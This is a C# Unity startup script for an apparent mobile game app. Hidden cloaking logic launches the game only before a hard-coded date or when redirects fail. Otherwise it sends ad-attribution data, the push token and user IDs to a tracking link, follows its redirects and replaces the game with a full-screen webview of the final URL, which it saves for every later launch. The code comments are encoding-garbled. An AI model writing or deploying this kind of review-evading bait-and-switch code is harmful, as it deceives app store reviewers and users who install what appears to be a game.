using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Threading.Tasks;
using System;
using System.Net;
using System.IO;
using System.Linq;
using UnityEngine.UI;
using UnityEngine.iOS;
using Unity.Advertisement.IosSupport;

public class IceCreamStartup : MonoBehaviour
{
    [SerializeField] private AppsFlyerObjectScript appsFlyerHandler;
    [SerializeField] private OneSignalStartup iceCreamOS;

    [SerializeField] private Text statusText;

    [SerializeField] private GameObject game; //
    [SerializeField] private string startLink;

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    private const string localUrlKey = "Local-Url";

    private bool NoInternet => Application.internetReachability == NetworkReachability.NotReachable;

    class CpaObject
    {
        public string referrer;
    }

    IEnumerator Start()
    {
#if !UNITY_EDITOR
        if (DateTime.UtcNow < new DateTime(2024, 2, 4)) LaunchGame();

        // ѕровер€ем, поддерживает ли устройство отслеживание рекламного идентификатора
        if (Device.advertisingTrackingEnabled)
        {
            // ѕровер€ем текущий статус разрешени€ отслеживани€
            if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus() == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                // ≈сли разрешение не определено, запрашиваем разрешение
                RequestTrackingPermission();
            }
            
            yield return new WaitUntil(() => ATTrackingStatusBinding.GetAuthorizationTrackingStatus() != ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED);
        }


        yield return null;

        var permissionRequest = RequestNotifyPermission();
        yield return new WaitUntil(() => permissionRequest.IsCompleted);

#endif

        try
        {
            appsFlyerHandler.Initialize();
            iceCreamOS.Initialize();
        }
        catch (Exception ex)
        {
            statusText.text += '\n' + ex.Message;
        }

        yield return null;

        if (NoInternet)
        {
            LaunchGame();
        }
        else
        {
            var saveLink = PlayerPrefs.GetString(localUrlKey, "null");
            if (saveLink == "null")
            {
                string linkExample = startLink;

                //APPS
                var delay = 15f;
                while (appsFlyerHandler.AttributionDataDictionary.Count == 0 && delay > 0)
                {
                    yield return new WaitForSeconds(1f);
                    delay -= 1f;
                }

                //OS
#if !UNITY_EDITOR
                try
                {
                    iceCreamOS.SetExternalId(appsFlyerHandler.AppsFlyer_Id);
                } 
                catch (Exception ex) { statusText.text += $"\n {ex}"; }

                yield return null;
#endif

                //link
                linkExample = ConnectAppsflyerSubs(linkExample, appsFlyerHandler.AttributionDataDictionary);
                yield return null;

                //REDI KEYTAR
                var redi = GetEndUrlInfoAsync(new Uri(linkExample));
                delay = 9f;
                while (!redi.IsCompleted && delay > 0f)
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                    delay -= Time.deltaTime;
                }

                yield return null;
                //CHECK
                if (!redi.IsCompleted || redi.IsFaulted) LaunchGame();

                yield return null;

                var successCode = ((int)redi.Result.StatusCode >= 200 && (int)redi.Result.StatusCode < 300) || redi.Result.StatusCode == HttpStatusCode.Forbidden;
                if (!successCode || redi.Result.RequestMessage.RequestUri.AbsoluteUri == linkExample) LaunchGame();

                yield return null;

                if (redi.Result.RequestMessage.RequestUri.AbsoluteUri.Contains("privacypolicyonline"))
                {
                    //OpenView(res.Result.RequestMessage.RequestUri.AbsoluteUri);
                    //yield return new WaitForSeconds(5f);
                    LaunchGame();
                }

                //////////////////////
                yield return null;
                OpenView(redi.Result.RequestMessage.RequestUri.AbsoluteUri);

                //Onesignal work
                while (string.IsNullOrEmpty(iceCreamOS.UserId))
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                }

                

                //////////////////////
                yield return null;

                PlayerPrefs.SetString(localUrlKey, redi.Result.RequestMessage.RequestUri.AbsoluteUri);
            }
            else
            {
                OpenView(saveLink);
            }
        }
    }

#region requests

    public static async Task<System.Net.Http.HttpResponseMessage> GetEndUrlInfoAsync(Uri uri, System.Threading.CancellationToken cancellationToken = default)
    {
        using var client = new System.Net.Http.HttpClient(new System.Net.Http.HttpClientHandler
        {
            AllowAutoRedirect = true,
        }, true);
        client.DefaultRequestHeaders.Add(UserAgentKey, UserAgentValue);

        using var response = await client.GetAsync(uri, cancellationToken);

        return response;
    }

#endregion

    UniWebView webView;
    private void OpenView(string url)
    {
        try
        {
            webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                // Set full screen again. If it is now in landscape, it is 640x320.
                Invoke("ResizeView", Time.deltaTime);
            };

            webView.Load(url);
            webView.Show();
            webView.OnMultipleWindowOpened += (view, id) => { webView.Load(view.Url); };
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
        }
        catch (Exception ex)
        {
            statusText.text += $"\n {ex}";
        }
    }

    private void ResizeView()
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }


#region link builder

    private string ConnectAppsflyerSubs(string oldLink, Dictionary<string, object> _dictionary)
    {
        var campignIdList = _dictionary.GetValueOrDefault("campaign")?.ToString().Split("_") ?? new string[0];

        return oldLink + $"&sub_id_4={_dictionary.GetValueOrDefault("campaign")}" +
            $"&sub_id_5={iceCreamOS.PushToken}" +
            $"&sub_id_6={_dictionary.GetValueOrDefault("af_siteid")}" +
            $"&sub_id_7={_dictionary.GetValueOrDefault("media_source")}" +
            $"&sub_id_8={_dictionary.GetValueOrDefault("adset_id")}" +
            $"&sub_id_9=" +
            $"&sub_id_10={appsFlyerHandler.AppsFlyer_Id}" +
            $"&sub_id_11={(campignIdList.Length > 0 ? campignIdList[0] : string.Empty)}" +
            $"&sub_id_12={(campignIdList.Length > 1 ? campignIdList[1] : string.Empty)}" +
            $"&sub_id_13={(campignIdList.Length > 2 ? campignIdList[2] : string.Empty)}" +
            $"&sub_id_14={(campignIdList.Length > 3 ? campignIdList[3] : string.Empty)}" +
            $"&sub_id_15={(campignIdList.Length > 4 ? campignIdList[4] : string.Empty)}" +
            $"&creative_id={_dictionary.GetValueOrDefault("adset")}" +
            $"&ad_campaign_id={_dictionary.GetValueOrDefault("campaign_id")}" +
            $"&keyword={_dictionary.GetValueOrDefault("campaign")}" +
            $"&source={Application.identifier}" +
            $"&external_id={iceCreamOS.UserId}";
    }

    #endregion

    private void LaunchGame()
    {
        game.SetActive(true);
        StopAllCoroutines();

        if (PlayerPrefs.HasKey(localUrlKey)) iceCreamOS.Unsubscribe();
    }

    public string GetHttpAgent()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
        try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("java.lang.System"))
            {
                if (cls != null)
                    return cls.CallStatic<string>("getProperty", "http.agent");
            }
        }
        catch (Exception e)
        {
            statusText.text += $"\n{e.Message}";
        }
#endif

        return string.Join(',', UserAgentValue);
    }

    public string GetAcceptLanguageHeader()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
                try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("androidx.core.os.LocaleListCompat"))
            {
                if (cls != null)
                    using (AndroidJavaObject locale = cls.CallStatic<AndroidJavaObject>("getAdjustedDefault"))
                    {
                        List<string> tags = new List<string>();
                        float size = locale.Call<int>("size");
                        float weight = 1.0f;

                        for(var i = 0; i < size; i++)
                        {
                            weight -= 0.1f;
                            tags.Add(locale.Call<AndroidJavaObject>("get", i).Call<string>("toLanguageTag") + $";q={weight}");
                        }

                        return string.Join(',', tags);
                    }
            }
        }
        catch (Exception e)
        {
            statusText.text += $"\n{e.Message}";
        }
#endif

        return "en-US;q=$0.9";
    }

    private async Task<bool> RequestNotifyPermission()
    {
        if (OneSignalSDK.OneSignal.Notifications.Permission) return true;

        return await OneSignalSDK.OneSignal.Notifications.RequestPermissionAsync(true);
    }

    #region ios

    void RequestTrackingPermission()
    {
        ATTrackingStatusBinding.RequestAuthorizationTracking();
    }

    #endregion
}